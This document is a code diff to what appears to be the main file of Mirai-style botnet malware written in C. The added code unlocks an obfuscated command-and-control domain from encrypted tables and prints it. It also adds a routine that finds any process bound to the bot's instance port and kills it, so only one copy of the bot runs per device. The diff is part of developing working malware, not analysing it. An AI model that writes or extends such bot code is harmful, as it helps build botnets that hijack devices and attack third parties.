@@ -12,9 +12,11 @@
 #include <netinet/in.h>
 
 #include "xhdrs/includes.h"
+#include "xhdrs/killer.h"
 #include "xhdrs/net.h"
 #include "xhdrs/packet.h"
-#include "xhdrs/sha256.h"
+//#include "xhdrs/sha256.h"
+#include "xhdrs/table.h"
 #include "xhdrs/utils.h"
 
 time_t proc_startup;
@@ -129,6 +131,41 @@ static void init_uniq_id(void)
     }
 }
 
+static void ensure_single_instance(void)
+{
+	int sockfd = -1;
+	
+	if((sockfd = net_bind("127.0.0.1", SINGLE_INSTANCE_PORT, IPPROTO_UDP)) < 0)
+	{
+		if(errno == EADDRNOTAVAIL || errno == EADDRINUSE)
+		{
+#ifdef DEBUG
+			util_msgc("Error", "Another instance is already running "
+				"(errno=%s)", strerror(errno));
+			util_msgc("Info", "Sending kill request: now");
+#endif
+			if((sockfd = net_connect("127.0.0.1", SINGLE_INSTANCE_PORT, IPPROTO_UDP)) < 0)
+			{
+#ifdef DEBUG
+				util_msgc("Error", "Failed to connect to SINGLE_INSTANCE_PORT"
+					" to request termination (errno=%s)", strerror(errno));
+#endif
+			}
+			
+			util_sleep(5);
+			close(sockfd);
+			killer_kill_by_port(SINGLE_INSTANCE_PORT);
+			ensure_single_instance();
+		}
+	}
+	else
+	{
+#ifdef DEBUG
+		util_msgc("Info", "We're the only instance on this system!");
+#endif
+	}
+}
+
 int main(int argc, char *argv[])
 {
 	ssize_t buflen;
@@ -142,6 +179,15 @@ int main(int argc, char *argv[])
 	proc_startup = time(NULL);
 	init_signals();
 	init_uniq_id();
+	
+	// Initiate obf tables;
+	table_init();
+	
+	table_unlock_val(TABLE_CNC_DOMAIN);
+	
+	printf("Test: %s\r\n", table_retrieve_val(TABLE_CNC_DOMAIN, 0));
+	
+	ensure_single_instance();
 	
 	LOCAL_ADDR = net_local_addr();
 	
